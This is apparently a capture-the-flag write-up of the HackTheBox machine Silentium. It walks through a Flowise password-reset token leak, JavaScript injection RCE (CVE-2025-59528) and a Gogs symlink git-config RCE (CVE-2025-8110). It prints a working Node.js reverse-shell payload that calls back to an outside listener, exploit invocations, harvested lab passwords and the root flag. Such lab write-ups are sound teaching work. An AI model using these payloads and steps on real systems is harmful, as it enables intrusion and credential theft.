# Silentium — HackTheBox Writeup

**Platform:** [Hack The Box](https://app.hackthebox.com/machines/Silentium)  
**Difficulty:** `Easy`  
**OS:** `Linux`  
**Author:** samurai

---

## Overview

Silentium is a Linux machine centered around modern AI platform vulnerabilities and internal service exploitation. The attack chain involves abusing a password-reset token disclosure to gain credentials for a Flowise AI platform, exploiting a critical JavaScript injection vulnerability (CVE-2025-59528) to achieve Remote Code Execution inside a Docker container, extracting credentials from environment variables to pivot to the host via SSH, and finally escalating to root by exploiting a symlink-based Git config injection vulnerability in a locally running Gogs instance (CVE-2025-8110).

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Initial Foothold — CVE-2025-59528 (Flowise RCE)](#initial-foothold)
4. [Container Escape — Credential Harvesting](#container-escape)
5. [Lateral Movement — SSH as ben](#lateral-movement)
6. [Privilege Escalation — CVE-2025-8110 (Gogs RCE)](#privilege-escalation)

---

## Reconnaissance

Port scanning was performed using RustScan for rapid port discovery, followed by an Nmap service scan for version and OS detection.

```bash
rustscan -a 10.129.26.112 -- -A
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
```

### Open Ports Summary

| Port | Protocol | Service | Version |
|------|----------|---------|---------|
| 22 | TCP | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | TCP | HTTP | nginx 1.24.0 — redirects to `silentium.htb` |

---

## Enumeration

### Virtual Host Discovery

Directory brute-forcing against the base domain returned minimal results. This indicated that the interesting content was likely hidden behind a virtual host. Subdomain fuzzing was performed using `ffuf`:

```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
     -H "Host: FUZZ.silentium.htb" \
     -u http://silentium.htb \
     -fs 178
```

**Result:** `staging.silentium.htb` was discovered (HTTP 200).

The subdomain was added to `/etc/hosts`:

```
10.129.26.112   silentium.htb staging.silentium.htb
```

### Flowise Platform Identification

Navigating to `http://staging.silentium.htb` revealed a **Flowise** AI platform instance. Flowise is an open-source low-code platform for building LLM-based workflows and AI agents.

### Password Reset Token Disclosure

The application exposed a password-reset endpoint. By examining the main site, three user email addresses were identified. Sending a reset request for `ben@silentium.htb` returned a valid reset token directly in the API response body — a classic information disclosure vulnerability:

```http
POST /api/v1/account/forgot-password HTTP/1.1
Host: staging.silentium.htb
Content-Type: application/json
x-request-from: internal

{"user": {"email": "ben@silentium.htb"}}
```

**Response (201 Created):** The response body contained the password reset token, allowing direct account takeover without any email interaction.

---

## Initial Foothold

### CVE-2025-59528 — Flowise CustomMCP Remote Code Execution

**CVSS:** 10.0 (Critical)  
**Affected versions:** Flowise >= 2.2.7-patch.1 and < 3.0.6

Using the obtained reset token, the `ben` account password was reset and a session was established on the Flowise platform.

**Vulnerability details:** The Flowise `CustomMCP` node processes user-supplied configuration via the `mcpServerConfig` parameter. Internally, the `convertToValidJSONString` function passes this input directly to JavaScript's `Function()` constructor — equivalent to `eval()` — without any validation or sanitisation. Since Flowise runs under Node.js with full runtime privileges, injected code has access to dangerous modules such as `child_process` and `fs`.

**Exploit:** A custom Python exploit script was used to authenticate and deliver the payload to the vulnerable endpoint:

```
POST /api/v1/node-load-method/customMCP
```

**Payload (Node.js reverse shell via `net` + `child_process`):**

```javascript
({x:(function(){
  const cp = process.mainModule.require("child_process");
  const net = process.mainModule.require("net");
  const sh = cp.spawn("/bin/sh", ["-i"]);
  const client = new net.Socket();
  client.connect(4444, "10.10.14.72", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
  });
  return 1;
})()})
```

A netcat listener was started on port 4444, and the exploit was triggered:

```bash
rlwrap nc -lnvp 4444
```

```
connect to [10.10.14.72] from (UNKNOWN) [10.129.28.15] 39426
/ # bash -i
```

A shell was obtained — running as `root` inside a Docker container.

---

## Container Escape

### Environment Variable Credential Harvesting

Standard Docker escape techniques (privileged mode, Docker socket mount) were unavailable. However, enumerating the container environment variables revealed several plaintext credentials:

```bash
env
```

```
FLOWISE_USERNAME=ben
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
SMTP_HOST=mailhog
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
```

Additionally, the Flowise database (`~/.flowise/database.sqlite`) and encryption key (`~/.flowise/encryption.key`) were accessible:

```bash
sqlite3 database.sqlite "SELECT name, passwd, salt FROM user;"
# → ben : $2a$05$2gbC/bWOwKr3lQWFY7TMv.90ZASEJbwmTLM4miWMzMx7D22kpNt6G

cat encryption.key
# → hdsVqdkOcLN4fwdpvMPtbAi2++qi8yFc
```

---

## Lateral Movement

### SSH Access as ben

The credentials harvested from the container environment were tested against the host SSH service. The `SMTP_PASSWORD` (`r04D!!_R4ge`) was reused as `ben`'s SSH password:

```bash
ssh ben@10.129.28.15
# Password: r04D!!_R4ge
```

```
ben@silentium:~$ ls
user.txt
```

**User flag captured.**

---

## Privilege Escalation

### Internal Service Discovery

After obtaining a shell as `ben`, internal port enumeration revealed an internal service on port 3001:

```bash
ss -tlnp
# 127.0.0.1:3001 — Gogs Git service
```

Examining the Gogs configuration confirmed the version and service details:

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
```

```ini
RUN_USER   = root
HTTP_PORT  = 3001
SECRET_KEY = sdsrcxSm0iC7wDO
```

Critically, Gogs was running as `root`.

### SSH Local Port Forwarding

The internal Gogs service was exposed to the attacker machine via SSH tunneling:

```bash
ssh -N -f -L 3001:127.0.0.1:3001 ben@silentium.htb
```

The Gogs interface was then accessible at `http://127.0.0.1:3001`.

### CVE-2025-8110 — Gogs Symlink Git Config Injection RCE

**Vulnerability details:** This vulnerability exploits Gogs' handling of repositories containing symlinks. An attacker creates a repository with a symlink pointing to the repository's own `.git/config` file. By subsequently updating the symlink target's contents via the Gogs API, the `.git/config` file can be overwritten with an arbitrary payload. The `sshCommand` directive in `.git/config` is executed when any Git SSH operation is triggered, resulting in arbitrary command execution as the Gogs service user (`root`).

**Exploit steps:**

Since self-registration was disabled on this Gogs instance, a user account (`hacker:hacker`) was created manually via the web interface. The exploit script was then modified to use these credentials (removing the auto-registration function):

```bash
python3 CVE-2025-8110.py -u http://localhost:3001 -lh 10.10.14.72 -lp 9001
```

**Exploit output:**

```
[+] Authenticated successfully
[+] Application token: b9c3bbfd66965a6d4db5a3d82a0501042c0d420e
Repo creation status: 201
[master d407ed7] Add malicious symlink
[+] Exploit sent, check your listener!
```

**Listener:**

```bash
rlwrap nc -lnvp 9001
```

```
connect to [10.10.14.72] from (UNKNOWN) [10.129.28.15] 38624
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# cd ~
root@silentium:~# cat /root/root.txt
bd1eef12f4354d2a1f0eb129920b8d97
```

**Root flag captured.**

---

## Attack Chain Summary

```
Port 80 (nginx)
    └─► Subdomain: staging.silentium.htb (Flowise)
            └─► Password reset token disclosure → Account takeover (ben)
                    └─► CVE-2025-59528 (Flowise CustomMCP JS Injection)
                            └─► RCE inside Docker container (root)
                                    └─► Env var credential leak → r04D!!_R4ge
                                            └─► SSH as ben → user.txt
                                                    └─► Internal Gogs on :3001 (running as root)
                                                            └─► CVE-2025-8110 (Symlink Git Config Injection)
                                                                    └─► RCE as root → root.txt
```

---

## CVEs Referenced

| CVE | Component | CVSS | Description |
|-----|-----------|------|-------------|
| CVE-2025-59528 | Flowise CustomMCP | 10.0 | Arbitrary JavaScript injection via `Function()` constructor in `mcpServerConfig` |
| CVE-2025-8110 | Gogs | — | Symlink-based `.git/config` overwrite leading to RCE via `sshCommand` |

---

## Key Takeaways

- API endpoints that return password reset tokens in response bodies are a critical information disclosure risk, bypassing the entire purpose of the reset flow.
- Container environment variables frequently hold plaintext credentials that are reused on the host system.
- Internal services running as privileged users (root) significantly amplify the impact of any RCE vulnerability found during lateral movement.
- Always verify whether a Gogs or Gitea instance allows unauthenticated registration, as exploit scripts may assume this capability.
